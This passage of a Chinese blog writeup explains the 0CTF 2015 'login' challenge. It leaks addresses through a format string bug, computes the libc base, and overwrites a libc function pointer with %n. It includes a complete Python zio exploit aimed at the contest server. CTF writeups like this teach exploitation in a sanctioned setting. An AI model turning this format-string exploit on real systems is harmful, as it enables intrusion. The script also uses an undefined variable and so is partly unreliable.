= (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</div><div class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 0x10uLL) )</div><div class="line">showflag_sub_FB3();</div><div class="line">&#125;</div><div class="line">printf(&amp;czUser, v3);</div><div class="line">puts(&quot; login failed.&quot;);</div><div class="line">puts(&quot;Threat detected. System shutdown.&quot;);</div><div class="line">exit(1);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>存在格式化字符串攻击</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序可以调用两次format string之后就调用exit(1)退出了。并且Full RELRO，所以可能的方法就是修改到libc加载的函数指针。提供方便的是程序里有打印flag的函数。 首先，通过调试发现寄存器里存在地址相关的信息，可以通过%016lx打印出来，栈相关的地址信息也有。程序加载的基址可以得到。栈里buffer的内容可以自己控制。通过读GOT表也能算出libc加载的基址和相对偏移。 要先写个程序把libc的相对偏移算出来。</p>
+<blockquote>
+<p>这边做的时候SB了看有提示ubuntu 14.04.2正好系统一样，就通过程序加载的地址直接算libc的基址，可能服务器有沙箱加载地址有变化结果本地可以远程一直不行……</p>
+</blockquote>
+<p>之后使用printf就通过%n修改libc的函数指针，之后就等flag了……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">dist_text_libcbasew = <span class="number">0x13acd000</span> - <span class="number">0x3be000</span></div><div class="line"></div><div class="line"><span class="comment"># target = ('./login')</span></div><div class="line">target = ((<span class="string">'202.112.26.107'</span>,<span class="number">10910</span>))</div><div class="line"></div><div class="line">io = zio(target, timeout=<span class="number">100000</span>,</div><div class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</div><div class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</div><div class="line">)</div><div class="line"></div><div class="line">io.writeline(<span class="string">'guest'</span>)</div><div class="line">io.writeline(<span class="string">'guest123'</span>)</div><div class="line">io.read_until(<span class="string">'Your choice:'</span>)</div><div class="line">io.writeline(<span class="string">'2'</span>)</div><div class="line">io.writeline(<span class="string">'a'</span>*<span class="number">256</span>)</div><div class="line">io.read_until(<span class="string">'Your choice:'</span>)</div><div class="line">io.writeline(<span class="string">'4'</span>)</div><div class="line">io.writeline(<span class="string">'%016lx%016lx%016lx'</span>)</div><div class="line">io.read_until(<span class="string">'Password: '</span>)</div><div class="line">io.gdb_hint()</div><div class="line">io.writeline(<span class="string">'1234'</span>)</div><div class="line"></div><div class="line">baddr = io.read(<span class="number">16</span>*<span class="number">3</span>)</div><div class="line"></div><div class="line">textbase = int(baddr[:<span class="number">16</span>],<span class="number">16</span>)</div><div class="line">textbase = textbase<span class="number">-0x1490</span></div><div class="line">retaddr = textbase - dist_text_libcbasew + <span class="number">0x38</span></div><div class="line"></div><div class="line"><span class="comment"># gen p</span></div><div class="line">sum = <span class="number">0</span></div><div class="line">p = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">t = (fun &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></div><div class="line">t = <span class="number">0x100</span> * i + t - sum</div><div class="line">sum += t</div><div class="line">p += <span class="string">'%0'</span></div><div class="line">p += str(t)</div><div class="line">p += <span class="string">'x'</span></div><div class="line">p += <span class="string">'%'</span></div><div class="line">p += <span class="string">'%d'</span> % (<span class="number">40</span> + i)</div><div class="line">p += <span class="string">'$n'</span></div><div class="line"></div><div class="line">p2 = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">p2 += l64(retaddr+i)</div><div class="line"></div><div class="line">io.writeline(p)</div><div class="line">io.read_until(<span class="string">'Password: '</span>)</div><div class="line">io.writeline(p2)</div><div class="line"></div><div class="line">io.read_until(<span class="string">'0ctf'</span>)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
+<p>flag:<strong>0ctf{login_success_and_welcome_back}</strong></p>
+
+            
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/0ctf/">0ctf</a> <a class="tag tag--primary tag--small t-link" href="/tags/writeup/">writeup</a>
+
+            </div>
+        
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/uncategorized/pwntools-quick-reference-guide/"  data-tooltip="Pwntools Quick Reference Guide">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/writeups/hctf2014final-qoobee-writeup/" data-tooltip="HCTF2014 FINAL 之pwn题qoobee1-6 writeup">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
+                <i class="fa fa-share-alt"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-google-plus"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-facebook-official"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-twitter"></i>
+            </a>
+        </li>
+        
+            <li class="post-action">
+                <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                    <i class="fa fa-comment-o"></i>
+                </a>
+            </li>
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#">
+            
+                <i class="fa fa-list"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 Eadom. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/uncategorized/pwntools-quick-reference-guide/"  data-tooltip="Pwntools Quick Reference Guide">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/writeups/hctf2014final-qoobee-writeup/" data-tooltip="HCTF2014 FINAL 之pwn题qoobee1-6 writeup">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
+                <i class="fa fa-share-alt"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-google-plus"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-facebook-official"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-twitter"></i>
+            </a>
+        </li>
+        
+            <li class="post-action">
+                <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                    <i class="fa fa-comment-o"></i>
+                </a>
+            </li>
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#">
+            
+                <i class="fa fa-list"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="1">
+    <ul class="share-options">
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
+            </a>
+        </li>
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+            </a>
+        </li>
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/0ctf-2015-writeup/">
+                <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+            </a>
+        </li>
+    </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Eadom</h4>
+        
+            <div id="about-card-bio"><p>NO PWN NO FUN</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>@Alibaba</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker"></i>
+                <br/>
+                Hangzhou
+            </div>
+        
+    </div>
+</div>
+
+        <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-close"></i></span>
+            <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    autofocus="autofocus"/>
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto100-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto100混沌密码锁writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto300-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto300比特币钱包writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto400-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto400地铁难挤writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/lianliankan-cheater/">
+                            <h3 class="media-heading">连连看外挂——人生真是寂寞如雪啊</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/rjsupplicant-for-linux/">
+                            <h3 class="media-heading">rjsupplicant for linux 锐捷代理破除多网卡限制</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 3, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/process-monoalphabetic-substitution-cipher/">
+                            <h3 class="media-heading">辅助处理单表替换密码</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 6, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto100-writerup/">
+                            <h3 class="media-heading">ACTF2014之crypto100古老writerup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 7, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto200-writerup/">
+                            <h3 class="media-heading">ACTF2014之crypto200买不到票的怨念writerup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 7, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/dll-injection/">
+                            <h3 class="media-heading">远程线程注入之DLL注入</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jun 19, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                            <h3 class="media-heading">不注入DLL实现远程线程注入</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jun 25, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                19 posts found
+            </p>
+        </div>
+    </div>
+</div>
+        
+<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-rt08quwts7iav5x0cfd2ym0gb5qkd1lvrsmwrakxtkhefmaaes4ywkmnjnwf.min.js"></script>
+<!--SCRIPTS END-->
+
+    
+        <script>
+             var disqus_config = function () {
+                 this.page.url = 'https://blog.eadom.net/writeups/0ctf-2015-writeup/';
+                 
+                    this.page.identifier = 'writeups/0ctf-2015-writeup/';
+                 
+             };
+            (function() {
+                var d = document, s = d.createElement('script');
+                var disqus_shortname = 'eadomblog';
+                s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+    
+
+
+
+    </body>
+</html>
